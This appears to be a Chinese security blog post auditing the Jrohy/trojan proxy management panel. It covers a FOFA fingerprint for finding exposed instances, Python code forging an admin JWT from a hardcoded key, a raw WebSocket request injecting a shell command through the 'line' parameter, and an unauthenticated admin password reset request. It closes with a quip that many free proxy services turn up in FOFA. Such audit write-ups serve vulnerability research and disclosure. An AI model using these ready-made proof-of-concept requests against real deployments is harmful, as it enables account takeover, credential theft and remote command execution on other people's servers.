---
title: "[技术]trojan多用户管理部署程序审计学习"
date: 2022-09-30T12:00:00+08:00
draft: false
author: "r0fus0d"

---

最近看到大佬提的issue，正好学习下

<!--more-->

---

- https://github.com/Jrohy/trojan

---

## 指纹特征

```markdown
/auth/check 路径会返回title值,可以用作指纹特征
{"code":200,"data":{"title":"AAA"},"message":"success"}

fofa 语句 body='href="./static/index.ab2a3fed.css">'
```

---

## 环境搭建

我这里图方便用docker搭建了

```markdown
docker run --name trojan-mariadb --restart=always -p 3306:3306 -v /home/mariadb:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=trojan -e MYSQL_ROOT_HOST=% -e MYSQL_DATABASE=trojan -d mariadb:10.2

docker run -it -d --name trojan --net=host --restart=always --privileged jrohy/trojan init
```

拉起后进入容器,这里得提前配置下域名解析,这个需要通过域名访问

```markdown
docker exec -it trojan bash

trojan
请选择使用证书方式: 1
请输入申请证书的域名: xxx.xxx.com

配置数据库,密码默认就是上面的 trojan
```

没啥问题,输入域名就能访问了

![](../../img/trojan-case/Untitled.png)

---

## 硬编码jwt密钥

在 `web/auth.go` 文件中

```go
func jwtInit(timeout int) {
	authMiddleware, err = jwt.New(&jwt.GinJWTMiddleware{
		Realm:       "k8s-manager",
		Key:         []byte("secret key"),
		Timeout:     time.Minute * time.Duration(timeout),
		MaxRefresh:  time.Minute * time.Duration(timeout),
		IdentityKey: identityKey,
		SendCookie:  true,
		PayloadFunc: func(data interface{}) jwt.MapClaims {
			if v, ok := data.(*Login); ok {
				return jwt.MapClaims{
					identityKey: v.Username,
				}
			}
			return jwt.MapClaims{}
		}
	......
	})
}
```

可以看到硬编码的 jwt 密钥 `secret key`

有jwt密钥我们就可以伪造任意用户的token,默认管理员用户是admin

先解码看下格式

![](../../img/trojan-case/Untitled%201.png)

测试生成admin的token

```python
import jwt
jwt.encode({'exp':1664179347,'id':'admin','orig_iat':1664172147},algorithm='HS256',key='secret key')
```

![](../../img/trojan-case/Untitled%202.png)

![](../../img/trojan-case/Untitled%203.png)

通过这个token访问 `/trojan/user` 接口可以得到除admin外所有用户账号密码,以及服务的对应域名

---

## 命令注入漏洞

在 `util/linux.go` 文件的LogChan函数中,存在命令执行函数exec

```go
func LogChan(serviceName, param string, closeChan chan byte) (chan string, error) {
	cmd := exec.Command("bash", "-c", fmt.Sprintf("journalctl -f -u %s -o cat %s", serviceName, param))

	stdout, _ := cmd.StdoutPipe()

	if err := cmd.Start(); err != nil {
		fmt.Println("Error:The command is err: ", err.Error())
		return nil, err
	}
	ch := make(chan string, 100)
	stdoutScan := bufio.NewScanner(stdout)
	go func() {
		for stdoutScan.Scan() {
			select {
			case <-closeChan:
				stdout.Close()
				return
			default:
				ch <- stdoutScan.Text()
			}
		}
	}()
	return ch, nil
}
```

查看调用

web/web.go 

```go
func trojanRouter(router *gin.Engine) {
	router.POST("/trojan/start", func(c *gin.Context) {
		c.JSON(200, controller.Start())
	})
	router.POST("/trojan/stop", func(c *gin.Context) {
		c.JSON(200, controller.Stop())
	})
	router.POST("/trojan/restart", func(c *gin.Context) {
		c.JSON(200, controller.Restart())
	})
	router.GET("/trojan/loglevel", func(c *gin.Context) {
		c.JSON(200, controller.GetLogLevel())
	})
	router.GET("/trojan/export", func(c *gin.Context) {
		result := controller.ExportCsv(c)
		if result != nil {
			c.JSON(200, result)
		}
	})
	router.POST("/trojan/import", func(c *gin.Context) {
		c.JSON(200, controller.ImportCsv(c))
	})
	router.POST("/trojan/update", func(c *gin.Context) {
		c.JSON(200, controller.Update())
	})
	router.POST("/trojan/switch", func(c *gin.Context) {
		tType := c.DefaultPostForm("type", "trojan")
		c.JSON(200, controller.SetTrojanType(tType))
	})
	router.POST("/trojan/loglevel", func(c *gin.Context) {
		slevel := c.DefaultPostForm("level", "1")
		level, _ := strconv.Atoi(slevel)
		c.JSON(200, controller.SetLogLevel(level))
	})
	router.POST("/trojan/domain", func(c *gin.Context) {
		c.JSON(200, controller.SetDomain(c.PostForm("domain")))
	})
	router.GET("/trojan/log", func(c *gin.Context) {
		controller.Log(c)
	})
}
```

其中/trojan/log路径调用controller.Log(c),传递参数c

跟进 Log方法，到 web/controller/trojan.go

```go
// Log 通过ws查看trojan实时日志
func Log(c *gin.Context) {
	var (
		wsConn *websocket.WsConnection
		err    error
	)
	if wsConn, err = websocket.InitWebsocket(c.Writer, c.Request); err != nil {
		fmt.Println(err)
		return
	}
	defer wsConn.WsClose()
	param := c.DefaultQuery("line", "300")
	if param == "-1" {
		param = "--no-tail"
	} else {
		param = "-n " + param
	}
	result, err := websocket.LogChan("trojan", param, wsConn.CloseChan)
	if err != nil {
		fmt.Println(err)
		wsConn.WsClose()
		return
	}
	for line := range result {
		if err := wsConn.WsWrite(ws.TextMessage, []byte(line+"\n")); err != nil {
			log.Println("can't send: ", line)
			break
		}
	}
}
```

可以看到param无过滤，直接被传给了LogChan

poc

```go
GET /trojan/log?line=300`touch%20/tmp/success`&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjQxNzkzNDcsImlkIjoiYWRtaW4iLCJvcmlnX2lhdCI6MTY2NDE3MjE0N30.iuFiunMc5kx8q4_2CZzAnGQPLjpSK0BW_1X6_bRdP04 HTTP/1.1
Host: xxx.xxx.com
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Upgrade: websocket
Origin: http://xxx.xxx.com
Sec-WebSocket-Version: 13
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjQxNzkzNDcsImlkIjoiYWRtaW4iLCJvcmlnX2lhdCI6MTY2NDE3MjE0N30.iuFiunMc5kx8q4_2CZzAnGQPLjpSK0BW_1X6_bRdP04
Sec-WebSocket-Key: NUAPtgysa4gd5VMU6znU1g==
```

![](../../img/trojan-case/Untitled%204.png)

---

## 前台管理员密码重置

在 web/auth.go `Auth` 方法

```go
func updateUser(c *gin.Context) {
	responseBody := controller.ResponseBody{Msg: "success"}
	defer controller.TimeCost(time.Now(), &responseBody)
	username := c.DefaultPostForm("username", "admin")
	pass := c.PostForm("password")
	err := core.SetValue(fmt.Sprintf("%s_pass", username), pass)
	if err != nil {
		responseBody.Msg = err.Error()
	}
	c.JSON(200, responseBody)
}

// Auth 权限router
func Auth(r *gin.Engine, timeout int) *jwt.GinJWTMiddleware {
	......	
	r.POST("/auth/register", updateUser)
	......
}
```

没有对注册方法做验证，这个是用于第一次打开应用时修改admin密码的，现在重复调用改接口可直接修改admin密码

poc

```go
POST http://xxx.xxx.com/auth/register HTTP/1.1
Host: xxx.xxx.com
Content-Length: 195
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymc8kPkyHhSLWSsTf
Connection: close

------WebKitFormBoundarymc8kPkyHhSLWSsTf
Content-Disposition: form-data; name="password"

f8cdb04495ded47615258f9dc6a3f4707fd2405434fefc3cbf4ef4e6
------WebKitFormBoundarymc8kPkyHhSLWSsTf--
```

直接 admin/123456 就可以登录了

![](../../img/trojan-case/Untitled%205.png)

fofa找找,大量的免费机场🥰

---

## 绕前端加密

抓下登录包

```
POST http://xxx.xxx.com/auth/login HTTP/1.1
Host: xxx.xxx.com
Content-Length: 90
Content-Type: application/json
Accept-Language: zh-CN,zh;q=0.9Connection: close

{"username":"admin","password":"e25388fde8290dc286a6164fa2d97e551b53498dcbf7bc378eb1f178"}
```

password字段被加密了,去前端找下

![](../../img/trojan-case/Untitled%206.png)

不出意外，控制台可调

```
CryptoJS.SHA224("1").toString();
```

![](../../img/trojan-case/Untitled%207.png)

---

## Source & Reference

- [https://github.com/Jrohy/trojan/issues/703](https://github.com/Jrohy/trojan/issues/703)
- [https://github.com/Jrohy/trojan/issues/704](https://github.com/Jrohy/trojan/issues/704)
